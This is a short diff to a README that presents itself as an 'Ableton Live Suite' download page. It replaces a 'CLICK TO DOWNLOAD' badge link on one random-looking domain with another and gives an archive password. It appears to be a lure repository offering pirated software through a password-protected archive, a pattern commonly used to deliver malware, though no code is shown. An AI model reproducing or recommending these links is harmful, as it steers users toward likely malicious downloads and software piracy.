@@ -1,6 +1,6 @@
 # Ableton Live Suite
 
-[![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://bipfdjnk.com/ableton-live-suite-2026)
+[![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://efhiwogvjd.com/ableton-live-suite-2026)
 > #### Archive password: `2026`
 
 
